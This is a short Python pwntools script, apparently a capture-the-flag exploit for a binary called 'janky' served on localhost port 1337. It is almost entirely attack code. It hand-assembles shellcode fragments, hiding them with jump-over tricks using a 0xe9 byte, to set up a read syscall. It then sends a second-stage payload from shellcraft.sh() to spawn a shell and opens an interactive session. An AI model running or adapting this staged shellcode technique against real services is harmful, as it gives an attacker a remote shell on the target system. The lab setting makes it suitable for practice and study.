from pwn import *
elf = ELF("janky")
context.log_level = "debug"
context.binary = elf

skip = asm("""
jmp here+1
here:
""")
set_rdi_rsi = asm("""
push rdx
pop rsi
xor edi, edi
""")
set_rdx = asm("""
mov al, 255
mov edx, eax
""")
set_rax_syscall = asm("""
xor eax, eax
syscall
""")
# rax = 0, rdi = 0, rsi = ptr, rdx = len

p = remote("localhost", 1337)
# p = process()
# p = elf.debug()
first = skip + b"\xe9" + set_rdi_rsi + skip + b"\xe9" + set_rdx + skip + b"\xe9" + set_rax_syscall
p.send(first)
pause()
p.send(b"A" * len(first) + asm(shellcraft.sh()))
p.interactive()
